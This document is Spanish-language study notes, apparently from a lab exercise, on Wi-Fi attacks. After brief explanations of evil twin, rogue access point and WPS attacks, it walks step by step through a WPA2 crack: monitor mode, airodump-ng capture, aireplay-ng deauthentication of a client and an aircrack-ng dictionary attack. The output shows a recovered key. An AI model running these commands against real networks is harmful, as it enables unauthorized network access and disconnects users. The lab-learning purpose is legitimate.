# Objetivos de aprendizaje

- Entender que es el Wifi
- Explorar la importancia para una organización
- Aprender direntes ataques Wifi
- Aprender sobre el WPA/WPA2 ataques de cracking

# Que es el Wifi

La importancia de Internet en nuestras vidas es un conocimiento universal sin la necesidad de justificación.

Wi-FI es la tecnología en la que se conectan los dispositivos de una red en forma global, a internet. 

Las listas de los puntos de acceso (Normalmente routers) que manda señadles Wi-fi con unicos nombres (SSID) tu puedes conectarte si sabes la conetraseña, porque hay una llave guardadda (PSK). Una vez te conectas satisfactoriamente puedes asignar una dirección IP dentor de la red, con un identificador unico que ayuda  a comunicarse entre dispositivos. 

La imagen debajo enseña un ejemplo de como sería un intento de acceso

![image](https://github.com/user-attachments/assets/d12b7b5a-fb63-4548-a5b4-a5172a165549)

# Wi-FI Rol Pivote en Organizaciones

Muchas organizaciones que dependen de internet. Usan conexiones para todos los empleados, todos los dispostiivos se pueden comunicar entre ellos. Debe haber una autoridad y una confianza entre dispostivios de empleados y privilegios

Sin embargo, un actor malicioso  que sepa meterse dentro de la red wifi. Es un gran problema porque no necesita saber la contraseña

# Ataques a WIFI

- Evil Twin Attack: En este ataque, los atacantes crean un punto falso de acceso con un nombre parecido. o igual, el ataque empieza mandando paquetes de-autenticación a todos los usuarios conectados a la red legitima. Los usuarios al estar desconectados, buscaran seguramente al wifi con mas señal y fuerza, la nuesta. Pudiendo ver todo el trafico a internet
- Rogue Acess Point: El objetivo de ataque es similiar al anterior. Este ataque, abre un punto de acceso cerca de la organización, los usuarios dentro de la organización se conectan automaticamente o accidentalmente. Cuando el atacante intercepta las comunicaciones
- WPS attack: Wi-FI Protected Setup (WPS) se creo para que los usuarios se conectaran a su Wi-FI usando 8 digitos sin necesidad de una contraseña. Estos ataquen se hacen normalmente con un "handshake" con el router y capturar la respuesta del router, contiendo los datos relativos al PIN y si es vulnerable los ataques de fuerza bruta.
- WPA/WPA2 cracking: Con un algoritmo mas fuerte, el ataque empieza mandando paquetes de-autentificación legitimos a los usuarios de la red desconectandolos, al intentar conectarse a la red, hay un 4-way handshake con el router durante este tiempo, el atacante adaptado en modo monito caputa dicho handshake. Depues se utiliza diccionarios de fuerza bruta para sacar la encriptación

# WPA/WPA2 CRACKING

Mencionado anteriormente, WPA/WPA2 se esta esperando el trafico WIFI para campturar los 4-way handhsake entre unos dispositivos y puntos de acceso. Mientras espera para conectarte al dispostiivo y reconectarte, se mandan dichos paquetes y se fuerza un nuevo "handhsake" despues de capturar se hace lo anteirormente dicho

![image](https://github.com/user-attachments/assets/b5f81165-c78f-44f4-bc6d-226247d747ee)

# The 4-way Handhsake

El crackeo de este tipo de contraseña envuelve el handshake utilizando PSK desencriptación.

Primero, el atacatne pòne el adaptador en modo monitor para escanear la red, el target especifica dicha red. 

Como funciona:

- Router manda un reto. El route manda un reto al cliente, preguntandole si sabe la contraseña
- Cliente responde con la información encriptada: El cliente le responde usando el PSK creado y con la respuesta encriptada
- Router verifica y manda confirmación: Si el router ve las respuestas las comprueba, si sabe que es el verdadero le deja si no pues no
- Check final y conexión entablecida

El handhsake no revela directamente PSK

## La vulnerabilidad

La vulnerabilidad coge el factor del atacante al caputar el aprenton, se usan ataques de fuerza bruta o diccionarios offile.

## Práctica

Con el comando siguiente podremos ver los archivos y las configuraciones usadas en las interfaces

```
iw dev
phy#2
	Interface wlan2
		ifindex 5
		wdev 0x200000001
		addr 02:00:00:00:02:00
		type managed
		txpower 20.00 dBm
```

1. Donde addr es la MAC/BSSID
2. type "managed" es el modo estandar como estanm los dispostivos wifi

Podemos usar para escanear

```
sudo iw dev wlan2 scan
BSS 02:00:00:00:00:00(on wlan2)
	last seen: 3216.508s [boottime]
	TSF: 1734953843169457 usec (20080d, 11:37:23)
	freq: 2437
	beacon interval: 100 TUs
	capability: ESS Privacy ShortSlotTime (0x0411)
	signal: -30.00 dBm
	last seen: 0 ms ago
	Information elements from Probe Response frame:
	SSID: MalwareM_AP
	Supported rates: 1.0* 2.0* 5.5* 11.0* 6.0 9.0 12.0 18.0 
	DS Parameter set: channel 6
	ERP: Barker_Preamble_Mode
	Extended supported rates: 24.0 36.0 48.0 54.0 
	RSN:	 * Version: 1
		 * Group cipher: CCMP
		 * Pairwise ciphers: CCMP
		 * Authentication suites: PSK
		 * Capabilities: 1-PTKSA-RC 1-GTKSA-RC (0x0000)
	Supported operating classes:
		 * current operating class: 81
	Extended capabilities:
		 * Extended Channel Switching
		 * Operating Mode Notification
```

Vemos bastante información:

- El BSSID y SSID
- RSN (Robust Securty Network) Indicando que usa wpa2
- El CCMP
- Sitios de autenticación
- Parameter set : channel 6

Usaremos ahora el modo monitor

```
sudo ip link set dev wlan2 down
sudo iw dev wlan2 set type monitor
sudo ip link set dev wlan2 up
```

Confirmamos

```
sudo iw dev wlan2 info
Interface wlan2
	ifindex 5
	wdev 0x200000001
	addr 02:00:00:00:02:00
	type monitor
	wiphy 2
	channel 1 (2412 MHz), width: 20 MHz (no HT), center1: 2412 MHz
	txpower 20.00 dBm
```

Ahora vale la pena tener par de terminales


Vamos a capturar el trafico que tenemos cercano

```
sudo airodump-ng wlan2
```

Nos dara información sobre BSSID y el cahnel donde se encuentra etc. Nos centraremos en "MalwareM_AP"

```
 CH 12 ][ Elapsed: 24 s ][ 2024-12-23 11:45 

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSI

 02:00:00:00:00:00  -28       20        1    0   6   54   WPA2 CCMP   PSK  Malw

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Pro

```

Ahora que ya tenemos esta info podemos tirar directamente

```
sudo airodump-ng -c 6 --bssid 02:00:00:00:00:00 -w output-file wlan2
```

Esto lo hacemos para captar clientes o trafico o información

```
 CH  6 ][ Elapsed: 24 s ][ 2024-12-23 11:46 

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH 

 02:00:00:00:00:00  -28 100      261        0    0   6   54   WPA2 CCMP   PSK  

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Pro

 02:00:00:00:00:00  02:00:00:00:01:00  -29    0 - 1      0        1
```

La STATION nos enseña el dispositivo o mAC

Ahora haremos 3 paquetes

- Paquetes desautenticación
- FOrzar reconexión
- Capturar hanshake

```
udo aireplay-ng -0 1 -a 02:00:00:00:00:00 -c 02:00:00:00:01:00 wlan2
11:47:58  Waiting for beacon frame (BSSID: 02:00:00:00:00:00) on channel 6
11:47:58  Sending 64 directed DeAuth (code 7). STMAC: [02:00:00:00:01:00] [ 0| 0 ACKs]
```

En la segunda terminal, capturaremos el handshake para intentar crackear dicha contraseña, por ejemplo un diccionario como el rockyou.txt

```
sudo aircrack-ng -a 2 -b 02:00:00:00:00:00 -w /home/glitch/rockyou.txt output*cap
Reading packets, please wait...
Opening output-file-01.cap
Read 277 packets.

1 potential targets



                               Aircrack-ng 1.6 

      [00:00:01] 504/513 keys tested (646.32 k/s) 

      Time left: 0 seconds                                      98.25%

                        KEY FOUND! [ fluffy/champ24 ]


      Master Key     : 54 42 17 98 25 7C 66 3C 5D 2A A4 C8 0A AC 37 E6 
                       80 92 EC FE 5E EE C3 AC DB 1D 80 6C 6D 54 D3 5E 

      Transient Key  : 6E 84 56 F6 0F 4F 78 9A A7 49 C1 C3 7C ED 16 F3 
                       16 3E FE E6 2C 50 E7 42 A5 F6 4B 1F 00 3B 1C 11 
                       B5 94 A6 AF 1B D1 63 8B C8 27 B4 15 42 81 03 90 
                       62 4F 8B BF 75 DA 96 0C 06 E2 23 BD A5 10 46 36 

      EAPOL HMAC     : B3 45 E1 7F 69 7F D6 A7 CE 47 03 9E B6 91 02 2E
```

Gracias a esto ya tneemos la forma de meternos vamos a probar

GG

